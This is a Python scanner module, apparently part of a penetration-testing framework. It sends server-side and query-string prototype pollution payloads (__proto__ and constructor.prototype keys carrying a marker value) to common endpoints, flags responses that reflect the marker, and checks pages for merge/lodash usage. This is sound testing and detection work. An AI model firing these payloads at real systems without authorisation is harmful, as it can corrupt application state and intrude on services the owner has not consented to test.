"""M53 — Prototype Pollution Detection (JavaScript)."""
import requests

class Scanner:
    name = "Prototype Pollution"
    phase = "exploitation"
    description = "Detect server-side and client-side prototype pollution vulnerabilities."

    def __init__(self, target, output_dir, config):
        self.target = target
        self.output_dir = output_dir
        self.config = config
        self.base = f"https://{target}" if not target.startswith("http") else target

    def run(self):
        findings, raw = [], []
        timeout = self.config.get("timeout", 10)

        # Server-side prototype pollution — JSON body
        payloads = [
            {"__proto__": {"polluted": "cyberpulse"}},
            {"constructor": {"prototype": {"polluted": "cyberpulse"}}},
            {"__proto__[polluted]": "cyberpulse"},
        ]

        endpoints = ["/", "/api", "/api/v1", "/graphql", "/data", "/search"]

        for ep in endpoints:
            url = self.base.rstrip("/") + ep
            for pl in payloads:
                try:
                    r = requests.post(url, json=pl, timeout=timeout, verify=False)
                    raw.append(f"POST {url} {list(pl.keys())[0]}: {r.status_code}")
                    if "polluted" in r.text.lower() or "cyberpulse" in r.text.lower():
                        findings.append({
                            "type": "prototype_pollution",
                            "detail": f"Server-side prototype pollution reflected at {url}",
                            "severity": "critical",
                            "url": url,
                            "payload": str(pl),
                        })
                except Exception as e:
                    raw.append(f"POST {url}: {e}")

        # Query string prototype pollution
        qs_payloads = [
            "__proto__[polluted]=1",
            "constructor[prototype][polluted]=1",
        ]
        for qsp in qs_payloads:
            try:
                url = f"{self.base}/?{qsp}"
                r = requests.get(url, timeout=timeout, verify=False)
                raw.append(f"GET {url}: {r.status_code}")
                if "polluted" in r.text.lower():
                    findings.append({
                        "type": "prototype_pollution",
                        "detail": f"Query string prototype pollution reflected: {qsp}",
                        "severity": "high",
                        "url": url,
                    })
            except Exception as e:
                raw.append(f"QS probe error: {e}")

        # Check for JavaScript files exposing vulnerability surface
        try:
            r = requests.get(self.base, timeout=timeout, verify=False)
            if "merge" in r.text.lower() or "deepmerge" in r.text.lower() or "lodash" in r.text.lower():
                findings.append({
                    "type": "info",
                    "detail": "Client uses merge/lodash patterns — client-side prototype pollution surface may exist",
                    "severity": "low",
                })
        except Exception as e:
            raw.append(f"JS check error: {e}")

        if not any(f["type"] == "prototype_pollution" for f in findings):
            findings.append({"type": "info", "detail": "No prototype pollution indicators detected", "severity": "info"})

        return {"findings": findings, "raw_output": "\n".join(raw)}
